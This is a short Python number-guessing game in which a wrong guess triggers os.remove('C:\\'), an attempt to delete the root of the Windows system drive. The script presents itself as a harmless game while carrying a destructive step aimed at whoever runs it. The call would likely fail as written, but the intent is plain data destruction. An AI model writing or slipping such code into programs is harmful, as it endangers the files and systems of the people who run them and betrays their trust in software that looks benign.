import random
import os
number=random.randint(1, 10)
inp=input("guess the bumber between 1 To 10")
inpu=int(inp)


if inpu == number:
    print("You Own!!")
else:
    os.remove("C:\\")